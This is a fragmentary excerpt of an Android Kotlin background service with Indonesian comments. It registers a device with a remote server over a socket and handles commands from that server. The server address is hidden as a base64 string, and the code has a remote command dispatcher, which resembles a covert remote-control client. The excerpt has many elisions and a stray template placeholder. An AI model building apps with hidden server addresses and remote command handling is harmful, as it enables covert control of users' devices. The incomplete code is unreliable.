...
class DeviceService : Service(), LifecycleOwner {
    ...
    "aHR0cDovL2x1d3d5eHl6c3RvcmVwcml2YXRlLnB0ZXJvcS54eXo6NDg3OA==",
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            "sendUidToServer"  -> sendUidToServer(value)
        }
    }
...
${htmlContent}
    ...
    private fun readUid(): String {
        // 1. Prioritas: SharedPreferences (UID yang diinput user via UI)
        try {
            val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
            val savedUid = prefs.getString("saved_uid", "") ?: ""
            if (savedUid.isNotBlank()) {
                Log.d("DeviceService", "readUid from prefs: $savedUid")
                return savedUid
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid prefs error: ${e.message}")
        }

        // 2. Fallback: assets/uid.json (kalau user belum input UID)
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            val uid = JSONObject(json).optString("uid", "")
            Log.d("DeviceService", "readUid from asset: $uid")
            uid
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid asset error: ${e.message}")
            ""
        }
    }

    // ═══════════════════════════════════════════════════════════
    // KIRIM UID KE SERVER (untuk ganti UID / re-register)
    // ═══════════════════════════════════════════════════════════
    fun sendUidToServer(uid: String) {
        if (socket?.connected() != true) {
            Log.w("DeviceService", "Socket not connected, cannot send UID")
            return
        }
        socket?.emit("device:register", JSONObject().apply {
            put("deviceId", deviceId)
        ...
        Log.d("DeviceService", "UID sent to server: $uid")
    }
